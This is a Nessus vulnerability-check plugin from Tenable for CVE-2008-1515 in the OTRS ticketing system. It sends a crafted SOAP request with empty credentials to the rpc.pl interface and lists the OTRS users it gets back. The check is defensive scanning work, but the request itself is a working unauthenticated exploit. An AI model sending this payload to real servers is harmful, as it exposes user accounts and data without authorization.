#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(31789);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2011/12/05 17:57:08 $");

  script_cve_id("CVE-2008-1515");
  script_bugtraq_id(28647);
  script_osvdb_id(44187);
  script_xref(name:"Secunia", value:"29585");

  script_name(english:"OTRS SOAP Interface Unauthenticated Object Manipulation");
  script_summary(english:"Tries to generate a list of users");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that does not properly
check for authentication.");
  script_set_attribute(attribute:"description", value:
"The remote host is running OTRS, a web-based ticketing request system. 

The version of OTRS installed on the remote host allows a remote
attacker to read and modify objects via the OTRS SOAP interface
without any credentials.");
  script_set_attribute(attribute:"see_also", value:"http://otrs.org/advisory/OSA-2008-01-en/");
  script_set_attribute(attribute:"solution", value:
"Upgrade to OTRS version 2.1.8 / 2.2.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(264);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/04/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:otrs:otrs");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2011 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/otrs", "/support", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure we're looking at OTRS.
  w = http_send_recv3(method:"GET", item:string(dir, "/customer.pl"), port:port);
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # If so...
  if ("OTRS Project" >< res || "OTRS  :: Login" >< res)
  {
    # Try to exploit the issue to get a list of users.
    #
    # See <http://dev.otrs.org/2.2/> for info about the underlying API.
    postdata = string(
      '<?xml version="1.0" encoding="UTF-8"?>\n',
      '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" \n',
      '      xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" \n',
      '      xmlns:xsd="http://www.w3.org/2001/XMLSchema" \n',
      '      soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" \n',
      '      xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n',
      '<soap:Body>\n',
      '  <Dispatch xmlns="/Core">\n',
      '      <c-gensym4 xsi:type="xsd:string" />\n',      # user == ""
      '      <c-gensym6 xsi:type="xsd:string" />\n',      # password == ""
      '      <c-gensym8 xsi:type="xsd:string">UserObject</c-gensym8>\n',
      '      <c-gensym10 xsi:type="xsd:string">UserList</c-gensym10>\n',
      '      <c-gensym12 xsi:type="xsd:string">Type</c-gensym12>\n',
      '      <c-gensym14 xsi:type="xsd:string">Long</c-gensym14>\n',
      '    </Dispatch>\n',
      ' </soap:Body>\n',
      '</soap:Envelope>'
    );
    w = http_send_recv3(method:"POST", port: port,
      item: dir+"/rpc.pl",
      content_type: "text/xml",
      add_headers: make_array('SOAPAction', '"/Core#Dispatch"'),
      data: postdata);
    if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
    res = w[2];

    # There's a problem if we were able to generate a response.
    if (
      "<s-gensym" >< res && 
      'xsd:int">' >< res
    )
    {
      # Parse out the list of users.
      report = "";

      n = strstr(res, 'xsd:int">') - 'xsd:int">';
      if (strlen(n)) n = n - strstr(n, '</');
      if (n =~ "^[0-9]$")
      {
        count = int(n);
        report = string(
          'Nessus successfully queried the remote SOAP interface for a list of\n',
          'OTRS users and found ', n
        );
        if (count == 0) report += '.\n';
        else
        {
          report += ' :\n\n';

          users = res;
          while ('xsd:string">' >< users)
          {
            users = strstr(users, 'xsd:string">') - 'xsd:string">';
	    user = users;
            if ('</s-gensym' >< user) user = user - strstr(user, '</s-gensym');
            if (user) report += '  - ' + user + '\n';
          }
        }
      }

      if (report_verbosity && report)
      {
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  }
}
